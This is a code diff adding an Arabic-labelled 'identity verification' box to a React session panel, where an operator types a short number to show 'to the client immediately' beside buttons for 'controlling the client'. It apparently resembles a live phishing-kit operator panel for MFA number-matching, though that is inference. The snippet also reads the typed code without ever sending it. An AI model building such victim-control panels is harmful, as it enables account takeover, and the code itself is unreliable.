@@ -362,6 +362,40 @@ function SessionBox({
               </div>
             )}
 
+            {/* التحقق من الهوية */}
+            <div className="rounded-3xl border border-purple-200 bg-purple-50 p-4">
+              <div className="text-xs font-semibold text-purple-700 mb-3">التحقق من الهوية</div>
+              <div className="flex gap-2">
+                <input
+                  type="text"
+                  id={`identity-code-${sessionId}`}
+                  placeholder="رقم التحقق (مثل: 5)"
+                  className="flex-1 rounded-2xl border border-purple-200 bg-white px-4 py-2 text-sm text-center font-mono focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-100"
+                  maxLength={10}
+                />
+                <button
+                  type="button"
+                  disabled={loadingAction === "identity_code"}
+                  onClick={async () => {
+                    const input = document.getElementById(`identity-code-${sessionId}`) as HTMLInputElement;
+                    const code = input?.value?.trim();
+                    if (!code) return;
+                    setLoadingAction("identity_code");
+                    try {
+                      await onControl(sessionId, "identity_code");
+                    } finally {
+                      setLoadingAction(null);
+                      if (input) input.value = "";
+                    }
+                  }}
+                  className="rounded-2xl bg-purple-600 px-4 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
+                >
+                  {loadingAction === "identity_code" ? "جارٍ..." : "إرسال"}
+                </button>
+              </div>
+              <p className="mt-2 text-[10px] text-purple-600">أدخل رقم أو نص ليظهر للعميل فوراً</p>
+            </div>
+
             {/* أزرار التحكم */}
             <div className="space-y-3">
               <p className="text-[10px] text-slate-400 font-semibold">التحكم بالعميل</p>
